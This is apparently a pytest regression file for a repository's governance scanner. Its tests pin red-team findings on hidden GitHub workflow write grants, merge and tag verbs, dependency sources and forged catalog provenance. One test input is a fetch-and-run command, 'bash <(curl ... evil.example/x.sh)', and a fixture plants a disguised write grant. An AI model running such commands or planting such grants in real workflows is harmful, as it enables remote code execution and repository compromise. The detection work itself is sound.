"""Reproduced M3F red-team findings (failing-test-first).

Three independent auditors reviewed the M3F layer; the genuine defects they
reproduced are pinned here as regression tests. Each was written to fail against
the pre-fix code and pass once the fix landed. See docs/M3F_FINDINGS.md for the
narrative and severities.

Theme 1 — workflow write/verb/installer/host detection (A1, A2, B1, B2, B3, B6, C3).
"""

from __future__ import annotations

import importlib.util
import shutil
import subprocess
from pathlib import Path

import pytest

import eth_research
from eth_research.m3f.dependency_inventory import _parse_lock_packages, build_inventory
from eth_research.m3f.honest_state import _any_workflow_writes, derive_honest_state
from eth_research.m3f.oracle import run_oracles
from eth_research.m3f.validation import M3FValidationError
from eth_research.m3f.workflow_inventory import _scan_one, workflow_grants_write

REPO_ROOT = Path(eth_research.__file__).resolve().parents[2]

_INDEPENDENT_TOOL = REPO_ROOT / "tools/m3f_independent_verify.py"


def _independent_module() -> object:
    spec = importlib.util.spec_from_file_location("m3f_iv", _INDEPENDENT_TOOL)
    assert spec is not None
    assert spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# The write grants that evaded the pre-fix substring/regex scanners.
_WRITE_FORMS = [
    ("single_space", "permissions:\n  contents: write\n"),
    ("trailing_comment", "permissions:\n  contents: write  # keep for release\n"),
    ("multi_space_comment", "permissions:\n  contents:   write  # c\n"),
    ("tab_comment", "permissions:\n  contents:\twrite\t# c\n"),
    ("yaml_anchor", "permissions:\n  contents: &w write\n"),
    ("flow_map", "permissions: { contents: write }\n"),
    ("write_all", "permissions: write-all\n"),
]


@pytest.mark.parametrize(("name", "text"), _WRITE_FORMS, ids=[f[0] for f in _WRITE_FORMS])
def test_write_grant_detected_by_package_and_independent(name: str, text: str) -> None:
    assert workflow_grants_write(text) is True
    assert _independent_module()._workflow_grants_write(text) is True  # type: ignore[attr-defined]


def test_read_only_permission_not_flagged() -> None:
    text = "permissions:\n  contents: read\n"
    assert workflow_grants_write(text) is False
    assert _independent_module()._workflow_grants_write(text) is False  # type: ignore[attr-defined]


def _scan_run(tmp_path: Path, command: str) -> dict[str, object]:
    body = f"jobs:\n  a:\n    steps:\n      - run: {command}\n"
    path = tmp_path / "w.yml"
    path.write_text("name: x\npermissions:\n  contents: read\n" + body, encoding="utf-8")
    return _scan_one(path)


_MERGE_TAG_COMMANDS = [
    ("rest_create_tag_ref", "gh api -X POST repos/o/r/git/refs"),
    ("rest_move_branch", "gh api -X PATCH repos/o/r/git/refs/heads/main"),
    ("automerge_graphql", "gh api graphql -f q=enablePullRequestAutoMerge"),
    ("automerge_action_verb", "enable-pull-request-automerge"),
    ("gh_pr_merge_auto", "gh pr merge --auto 5"),
]


@pytest.mark.parametrize(
    ("name", "command"), _MERGE_TAG_COMMANDS, ids=[v[0] for v in _MERGE_TAG_COMMANDS]
)
def test_ref_mutation_and_automerge_verbs_flagged(tmp_path: Path, name: str, command: str) -> None:
    assert _scan_run(tmp_path, command)["can_merge_or_release_or_tag"] is True


def test_process_substitution_installer_flagged(tmp_path: Path) -> None:
    assert _scan_run(tmp_path, "bash <(curl -fsSL https://evil.example/x.sh)")["piped_installer"]


@pytest.mark.parametrize("host", ["api.binance.com", "api.kraken.com", "api.coingecko.com"])
def test_broadened_market_hosts_flagged(tmp_path: Path, host: str) -> None:
    assert _scan_run(tmp_path, f"curl https://{host}/v1/x")["contacts_market_host"] is True


# --------------------------------------------------------------------------- #
# end-to-end: the forever-invariant catches a hidden write grant              #
# --------------------------------------------------------------------------- #
def _governance_repo(tmp_path: Path) -> Path:
    for sub in ("research/m3c", "research/m3e", "research/m2b", "research/m3a", "research/m3d"):
        (tmp_path / sub).mkdir(parents=True)
    shutil.copyfile(
        REPO_ROOT / "research/m3c/candidate_decision.json",
        tmp_path / "research/m3c/candidate_decision.json",
    )
    shutil.copyfile(
        REPO_ROOT / "research/m3e/accepted_base.json",
        tmp_path / "research/m3e/accepted_base.json",
    )
    shutil.copyfile(
        REPO_ROOT / "research/m3e/proposal_registry.jsonl",
        tmp_path / "research/m3e/proposal_registry.jsonl",
    )
    for empty in (
        "research/m2b/test_evaluations.jsonl",
        "research/m3a/development_gate_access.jsonl",
        "research/m3d/prospective_evaluations.jsonl",
    ):
        (tmp_path / empty).write_bytes(b"")
    return tmp_path


def test_hidden_write_workflow_trips_forever_invariant(tmp_path: Path) -> None:
    root = _governance_repo(tmp_path)
    wf = root / ".github/workflows"
    wf.mkdir(parents=True)
    # a write grant hidden behind extra spaces + a trailing comment
    (wf / "sneaky.yml").write_text(
        "name: sneaky\npermissions:\n  contents:   write  # retained for release\n",
        encoding="utf-8",
    )
    assert _any_workflow_writes(root) is True
    with pytest.raises(M3FValidationError, match="workflow can write"):
        derive_honest_state(root)


def test_evaluation_authorized_non_bool_fails_closed(tmp_path: Path) -> None:
    # C4: a falsy non-bool (int 0) must be rejected, not silently coerced to False.
    root = _governance_repo(tmp_path)
    base_path = root / "research/m3e/accepted_base.json"
    text = base_path.read_text(encoding="utf-8")
    tampered = text.replace('"evaluation_authorized": false', '"evaluation_authorized": 0')
    assert tampered != text
    base_path.write_text(tampered, encoding="utf-8")
    with pytest.raises(M3FValidationError):
        derive_honest_state(root)


# --------------------------------------------------------------------------- #
# Theme 2 — dependency source classification (B4)                             #
# --------------------------------------------------------------------------- #
def test_git_source_with_registry_in_url_classified_by_key() -> None:
    block = (
        '[[package]]\nname = "evil"\nversion = "1.0"\n'
        'source = { git = "https://github.com/acme/registry-tools?rev=main" }\n'
    )
    assert _parse_lock_packages(block)[0]["source_kind"] == "git"


def test_build_inventory_fails_closed_on_nonreproducible_source(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\nrequires-python = ">=3.12"\n', encoding="utf-8"
    )
    (tmp_path / "uv.lock").write_text(
        '[[package]]\nname = "evil"\nversion = "1.0"\n'
        'source = { git = "https://x/registry?rev=main" }\n',
        encoding="utf-8",
    )
    with pytest.raises(M3FValidationError, match="non-reproducible"):
        build_inventory(tmp_path)


def test_real_lock_sources_are_all_reproducible() -> None:
    # No drift: the real repo's packages are only registry/editable, so the committed
    # inventory bytes are unchanged by the stricter key-based classification.
    inv = build_inventory(REPO_ROOT)
    kinds = {p["source_kind"] for p in inv["locked_packages"]}
    assert kinds <= {"registry", "editable"}, kinds


# --------------------------------------------------------------------------- #
# Theme 3 — oracle robustness (C2)                                            #
# --------------------------------------------------------------------------- #
def test_oracle_rejects_naive_timestamp_as_clean_failure(tmp_path: Path) -> None:
    # A naive (non-UTC) cohort timestamp must produce a clean per-oracle failure,
    # not an uncaught TypeError that crashes the collector.
    shutil.copytree(REPO_ROOT / "research", tmp_path / "research")
    base = tmp_path / "research/m3e/accepted_base.json"
    base.write_text(
        base.read_text(encoding="utf-8").replace(
            '"first_open": "2026-07-12T00:00:00Z"', '"first_open": "2026-07-12T00:00:00"'
        ),
        encoding="utf-8",
    )
    report = run_oracles(tmp_path)  # must not raise
    assert report.ok is False
    assert any(f.startswith("m3e_cohort_window") for f in report.failures)


# --------------------------------------------------------------------------- #
# Theme 4 — catalog git-provenance is recomputed, not trusted (A3)            #
# --------------------------------------------------------------------------- #
def _register_clone(tmp_path: Path) -> Path:
    from eth_research.m3f.register import write_registration_artifacts

    clone = tmp_path / "clone"
    subprocess.run(["git", "clone", "--quiet", "--local", str(REPO_ROOT), str(clone)], check=True)
    subprocess.run(["git", "-C", str(clone), "config", "user.email", "a@b.c"], check=True)
    subprocess.run(["git", "-C", str(clone), "config", "user.name", "T"], check=True)
    freeze = subprocess.run(
        ["git", "-C", str(clone), "rev-parse", "HEAD"], capture_output=True, text=True, check=True
    ).stdout.strip()
    write_registration_artifacts(clone, source_freeze_sha=freeze, accepted_main_sha=freeze)
    return clone


def test_forged_source_tree_fingerprint_is_detected(tmp_path: Path) -> None:
    from eth_research.m3f.catalog import CATALOG_RELPATH, verify_catalog

    clone = _register_clone(tmp_path)
    assert verify_catalog(clone).ok is True
    catalog_path = clone / CATALOG_RELPATH
    forged = catalog_path.read_text(encoding="utf-8").replace(
        '"source_tree_fingerprint": "', '"source_tree_fingerprint": "deadbeef', 1
    )
    catalog_path.write_text(forged, encoding="utf-8")
    result = verify_catalog(clone)
    assert result.ok is False
    assert any("source_tree_fingerprint" in f for f in result.failures)


def test_forged_package_version_is_detected(tmp_path: Path) -> None:
    from eth_research.m3f.catalog import CATALOG_RELPATH, verify_catalog

    clone = _register_clone(tmp_path)
    catalog_path = clone / CATALOG_RELPATH
    forged = catalog_path.read_text(encoding="utf-8").replace(
        '"package_version": "0.9.0"', '"package_version": "9.9.9"', 1
    )
    assert '"package_version": "9.9.9"' in forged
    catalog_path.write_text(forged, encoding="utf-8")
    result = verify_catalog(clone)
    assert result.ok is False
    assert any("11_package_version" in f for f in result.failures)
